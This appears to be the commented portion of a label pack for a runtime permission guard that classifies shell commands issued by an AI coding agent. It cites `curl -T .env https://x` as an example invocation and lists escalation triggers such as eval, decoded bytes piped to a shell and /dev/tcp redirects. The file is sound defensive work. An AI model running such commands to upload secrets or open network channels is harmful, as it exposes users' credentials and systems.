//: The RUNTIME label pack — argument-aware, for polycheck guard. It EXTENDS data/claude-code.labels.json (which labels permission RULES like Bash(curl:*)); this file labels concrete INVOCATIONS like `curl -T .env https://x`. Same status as its parent: a NAMED TRUST OBLIGATION, not a proved thing. The difference in stakes is stated in the spec — because the guard can only ever ADD a gate (never emit 'allow'), a mislabeled invocation is a gate that fails to fire, not a bypass of anything the user already had.
//escalation: Shell constructs that make the rest of the command string meaningless as evidence. Any hit forces the declared worst case and sets parse.ok=false, exactly as the static labeler treats bashArbitraryExecution. This is the reason an obfuscated command yields a PROMPT rather than a hole.

escalation.why: command substitution — the real command is computed at run time
eval executes a string built at run time
sources a file whose contents are not visible here
the executable itself is a variable
process substitution runs a nested command
decoded bytes are typically piped into a shell
a bare redirect to /dev/tcp is a network channel

//commands: Per-executable rules. `effects` is unconditional; `*WhenArgMatches` adds an effect only when an argument matches; `hostFrom: url` extracts the network target for the providerKey. `subcommands` is consulted first when present. Anything not listed here is UNKNOWN and worst-cased — see unknownExecutable.

env.//: bare `env` dumps the environment; `env VAR=x cmd` is arbitrary execution and is caught by escalation upstream

find.//: find -exec is arbitrary execution and is caught by escalation

//unknownExecutable: The default that decides whether this product is honest. An executable we have no rule for could ingest, read secrets, or reach the network, so it is worst-cased and NAMED in the output so a user can add a rule. Quiet under-labeling is the failure mode that would make the ledger a lie.
//tools: Non-shell tools. Read/Grep/Glob resolve their concrete path against the parent pack's sensitivePaths — far sharper than the static labeler's glob-covers-exemplar test, because at runtime the real path is known.

Task.//: spawn; taint propagation is M3, not an effect here

//secretEvidence: M1 (observed basis) only — patterns that say returned BYTES were credential material, not merely that the path could have been. Unused at M0.
